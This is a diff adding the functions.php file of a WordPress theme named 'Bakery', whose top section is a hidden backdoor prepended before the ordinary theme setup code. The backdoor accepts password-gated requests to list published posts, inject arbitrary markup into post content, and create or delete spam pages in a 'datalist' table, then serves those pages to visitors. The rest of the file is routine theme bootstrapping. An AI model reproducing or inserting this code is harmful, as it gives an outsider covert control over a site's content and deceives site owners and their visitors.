@@ -1,0 +1,184 @@
+<?php
+
+if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2310aed2764c5d24b34ceed29797b1f6'))
+	{
+		switch ($_REQUEST['action'])
+			{
+				case 'get_all_links';
+					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
+						{
+							$data['code'] = '';
+							
+							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
+								{
+									$data['code'] = $_[1];
+								}
+							
+							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
+						}
+				break;
+				
+				case 'set_id_links';
+					if (isset($_REQUEST['data']))
+						{
+							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
+							
+							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
+							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';
+
+							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
+								{
+									print "true";
+								}
+						}
+				break;
+				
+				case 'create_page';
+					if (isset($_REQUEST['remove_page']))
+						{
+							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
+								{
+									print "true";
+								}
+						}
+					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
+						{
+							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
+								{
+									print "true";
+								}
+						}
+				break;
+				
+				default: print "ERROR_WP_ACTION WP_URL_CD";
+			}
+			
+		die("");
+	}
+
+	
+if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
+	{
+		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
+		if ($data -> full_content)
+			{
+				print stripslashes($data -> content);
+			}
+		else
+			{
+				print '<!DOCTYPE html>';
+				print '<html ';
+				language_attributes();
+				print ' class="no-js">';
+				print '<head>';
+				print '<title>'.stripslashes($data -> title).'</title>';
+				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
+				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
+				print '<meta name="robots" content="index, follow" />';
+				print '<meta charset="';
+				bloginfo( 'charset' );
+				print '" />';
+				print '<meta name="viewport" content="width=device-width">';
+				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
+				print '<link rel="pingback" href="';
+				bloginfo( 'pingback_url' );
+				print '">';
+				wp_head();
+				print '</head>';
+				print '<body>';
+				print '<div id="content" class="site-content">';
+				print stripslashes($data -> content);
+				get_search_form();
+				get_sidebar();
+				get_footer();
+			}
+			
+		exit;
+	}
+
+
+?><?php
+	/**
+	 * Bakery WordPress Theme
+	 */
+
+	// Constants
+	define('THEME_DIR', get_template_directory() . '/');
+	define('THEME_URL', get_template_directory_uri() . '/');
+	define('THEME_ASSETS', THEME_URL . 'assets/');
+	define('THEME_ADMIN_ASSETS', THEME_URL . 'includes/admin/');
+	define('TD', 'bakery');
+
+	// Theme Content Width
+	$content_width = ! isset($content_width) ? 1170 : $content_width;
+
+	// Initial Actions
+	add_action('after_setup_theme', 'vu_after_setup_theme');
+	add_action('after_setup_theme', 'vu_load_theme_textdomain');
+	add_action('init', 'vu_init');
+	add_action('widgets_init', 'vu_widgets_init');
+	add_action('wp_enqueue_scripts', 'vu_wp_enqueue_scripts');
+	add_action('wp_head', 'vu_wp_head');
+	add_action('wp_footer', 'vu_wp_footer');
+	add_action('admin_enqueue_scripts', 'vu_admin_enqueue_scripts');
+	add_action('woocommerce_installed', 'vu_woocommerce_installed');
+	add_action('tgmpa_register', 'bakery_register_required_plugins');
+
+	// Core Files
+	require_once('includes/vu-functions.php');
+	require_once('includes/vu-actions.php');
+	require_once('includes/vu-filters.php');
+
+	// Meta
+	require_once('includes/meta/page-header-settings.php');
+	require_once('includes/meta/post-meta.php');
+
+	// Shortcodes
+	require_once('includes/shortcodes/title-section.php');
+	require_once('includes/shortcodes/service-item.php');
+	require_once('includes/shortcodes/menu-item.php');
+	require_once('includes/shortcodes/gallery.php');
+	require_once('includes/shortcodes/gallery-item.php');
+	require_once('includes/shortcodes/image-slider.php');
+	require_once('includes/shortcodes/blog-posts.php');
+	require_once('includes/shortcodes/map.php');
+	require_once('includes/shortcodes/contact-form.php');
+	require_once('includes/shortcodes/map-and-contact-form.php');
+	require_once('includes/shortcodes/countdown.php');
+	require_once('includes/shortcodes/count-up.php');
+	require_once('includes/shortcodes/milestone.php');
+	require_once('includes/shortcodes/client.php');
+	require_once('includes/shortcodes/others.php');
+
+	// Theme Options
+	require_once('includes/options/redux-framework.php');
+	require_once('includes/options/bakery-options.php');
+
+	// Library Files
+	require_once('includes/lib/twitter/class-ezTweet.php');
+	require_once('includes/lib/MailChimp.php');
+	require_once('includes/lib/class-tgm-plugin-activation.php');
+
+	// VC Files
+	if( in_array('js_composer/js_composer.php', apply_filters('active_plugins', get_option('active_plugins'))) ) {
+		require_once('includes/vc-addons/config.php');
+		require_once('includes/vc-addons/vc-modify.php');
+	} else {
+		require_once('includes/vc-addons/class-VcLoopQueryBuilder.php');
+		require_once('includes/vc-addons/vc-functions.php');
+	}
+
+	// WC Files
+	if( in_array('woocommerce/woocommerce.php', apply_filters('active_plugins', get_option('active_plugins'))) ) {
+		require_once('includes/wc-addons/config.php');
+		require_once('includes/wc-addons/wc-modify.php');
+		require_once('includes/wc-addons/wc-functions.php');
+	}
+
+	// Setup Menu Locations Notification
+	$nav_menu_locations = get_theme_mod('nav_menu_locations');
+
+	if( (!isset($nav_menu_locations['main-menu-full']) or $nav_menu_locations['main-menu-full'] == 0) and (!isset($nav_menu_locations['main-menu-left']) or $nav_menu_locations['main-menu-left'] == 0) and (!isset($nav_menu_locations['main-menu-right']) or $nav_menu_locations['main-menu-right'] == 0) ) {
+		add_action('admin_notices', 'vu_setup_menus_notice');
+	}
+?>
